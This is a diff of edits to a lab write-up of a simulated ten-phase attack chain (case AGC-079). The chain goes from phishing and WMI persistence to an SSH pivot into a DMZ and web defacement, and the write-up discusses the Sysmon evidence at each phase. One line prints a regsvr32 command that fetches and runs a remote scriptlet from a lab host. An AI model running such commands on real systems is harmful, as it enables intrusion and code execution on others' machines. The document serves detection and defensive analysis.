@@ -19,7 +19,7 @@
 
 ### Simulation
 
-10-phase cross-environment attack chain spanning Windows endpoint (COMPROMISED-HOST-01) and Linux DMZ host (EXT-ATTACKER-SIM as substitute for DMZ-LINUX-01 whose Guest Additions are broken). The attack begins with credential phishing via a lookalike domain, escalates through proxy execution and WMI persistence, pivots to the DMZ via discovered SSH credentials, and culminates in web defacement.
+10-phase cross-environment attack chain spanning a Windows endpoint (COMPROMISED-HOST-01) and a Linux DMZ host (EXT-ATTACKER-SIM standing in for DMZ-LINUX-01, whose Guest Additions are broken). It opens with credential phishing off a lookalike domain, moves through proxy execution and WMI persistence, pivots to the DMZ on discovered SSH credentials, and ends in web defacement.
 
 **Windows phases** (00:15:18 - 00:16:28 UTC): Phases 1-4 on COMPROMISED-HOST-01
 **Linux phases** (00:17:59 - 00:18:08 UTC): Phases 5-10 on EXT-ATTACKER-SIM
@@ -80,7 +80,7 @@ HTTP GET returned 1446 bytes (phishing portal page "Acme Corp Portal"). POST sub
 
 Attempted `regsvr32.exe /s /n /u /i:http://10.10.40.10/stage2.sct scrobj.dll` to download and execute a scriptlet via signed Windows binary.
 
-**Result**: Access denied by Windows Defender/SmartScreen. The attempt itself was blocked before process creation, so no Sysmon EID 1 was generated for regsvr32.exe. In a production environment with weaker endpoint protection, this would generate EID 1 with the full command line and EID 3 for the HTTP fetch of the .sct file.
+**Result**: Access denied by Windows Defender/SmartScreen. The block landed before process creation, so no Sysmon EID 1 fired for regsvr32.exe. On a host with weaker endpoint protection, this would produce EID 1 with the full command line and EID 3 for the HTTP fetch of the .sct file.
 
 **Lab constraint**: Windows 11 Tamper Protection + Defender blocked the regsvr32 proxy execution. The technique is documented as attempted-and-blocked.
 
@@ -117,7 +117,7 @@ Consumer: "\\.\ROOT\subscription:CommandLineEventConsumer.Name=\"AGC079UpdateCon
 Filter: "\\.\ROOT\subscription:__EventFilter.Name=\"AGC079UpdateFilter\""
 ```
 
-The WMI subscription triggers every 60 seconds when `Win32_PerfFormattedData_PerfOS_System` changes (effectively always), executing a hidden PowerShell script — classic fileless persistence.
+The WMI subscription fires every 60 seconds when `Win32_PerfFormattedData_PerfOS_System` changes — that is, almost always — running a hidden PowerShell script with no payload on disk.
 
 #### Phase 4: Credential Access — Credentials in Files (T1552.001)
 
@@ -135,7 +135,7 @@ Discovered files:
 - `C:\Scripts\dmz-maintenance.ps1` — contains SSH connection details (user: dmzadmin, host: 10.10.20.10)
 - `C:\Scripts\dmz_maint_key` — OpenSSH private key for DMZ access
 
-**Note**: This is the weakest phase in the chain. The credential file discovery relies on the attacker finding an existing maintenance script, which is circumstantial. In production, this would require more investigation to determine if the script was intentionally planted or a legitimate operational artifact.
+**Note**: This is the weakest phase in the chain. The find depends on the attacker stumbling on an existing maintenance script, which is circumstantial. In production, an analyst would need more context to tell whether the script was planted or a real operational artifact.
 
 #### Phase 5: Lateral Movement — SSH Pivot (T1021.004)
 
@@ -214,7 +214,7 @@ The original "Acme Corp Portal" page on EXT-ATTACKER-SIM's port 80 was replaced 
 
 ### Report
 
-AGC-079 demonstrates a realistic multi-environment attack chain that begins with social engineering on a Windows endpoint and culminates in DMZ web defacement. The chain crosses two network zones (Corporate and DMZ) using discovered SSH credentials as the pivot mechanism.
+AGC-079 starts with social engineering on a Windows endpoint and ends with DMZ web defacement. It crosses two network zones, Corporate and DMZ, with the discovered SSH credentials as the pivot between them.
 
 **Confidence is High (not Critical)** because Phase 4 (credential discovery) represents the weakest evidential link in the chain — the credential file discovery is circumstantial and in production would require additional context to determine if the maintenance script was pre-existing or attacker-planted. All other phases have strong evidential support.
 
